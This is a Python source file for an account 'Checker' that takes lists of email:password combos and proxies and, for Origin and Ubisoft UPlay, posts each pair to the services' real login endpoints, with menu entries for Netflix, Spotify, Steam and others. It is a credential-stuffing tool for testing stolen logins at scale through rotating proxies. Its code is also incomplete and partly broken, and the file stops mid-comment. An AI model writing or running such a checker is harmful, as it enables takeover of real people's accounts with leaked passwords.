import requests, urllib, sys, base64

def Checker(combos, proxys):
    urls = ["https://signin.ea.com/p/originX/login?initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Dde_DE%26client_id%3DORIGIN_SPA_ID", "https://public-ubiservices.ubi.com/v3/profiles/sessions"]

    switcher = {

            "Origin":1,
            "UPlay":2,
            "Steam":3,
            "Spotify":4,
            "GOG":5,
            "Netflix":6,
            "Hulu":7,
            "Epic Games":8,
            "Disney+":9

            }

    print("""
            Welcome to the Checker!

            Streaming:
            Spotify,
            Netflix,
            Hulu,
            Disney+,

            Games:
            Steam,
            GOG,
            Epic Games,
            Origin,
            UPlay
            """)

    i = input("")
    a = switcher.get(i, None)
    if a is None:
        sys.exit()
    print(a)

    # 409 = Proxy Error
    # 401 = Invalid Login

    r = combos
    prx = []
    i = 0
    for proxy in proxys:
        i += 1
        prx.append(i)
    print(prx)
    if a == 1:
        for account in r:
            account = account.replace("\n", "")
            a = account.split(":")
            print(a)
            user = a[0]
            pwd = a[1]
            payload = {
                    "email": user,
                    "password": pwd
                    }
            with requests.Session() as s1:
                p = s1.post(urls[0], data=payload, proxies=proxy)



    if a == 2:
        for account in r:
            account = account.replace("\n", "")
            token = base64.b64encode(bytes(account, "utf-8"))
            token = "Basic " + token.decode("UTF-8")
            with requests.Session() as s:
                p = s.post(urls[1], headers = {
                        "Method":"POST",
                        "Accept": "application/json",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Accept-Language": "en_US,en;q=0.5",
                        "Connection": "keep-alive",
                        "Content-Type": "application/json",
                        'Authority':'public-ubiservices.ubi.com',
                        'referer':'https://ubisoftconnect.com/',
                        'Ubi-AppId':'314d4fef-e568-454a-ae06-43e3bece12a6',
                        "Authorization": token,
                        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
                        'Ubi-RequestedPlatformType':'uplay',
                        }, proxies=proxy)
                print(account)
                
        

    # POST
    # https://public-s
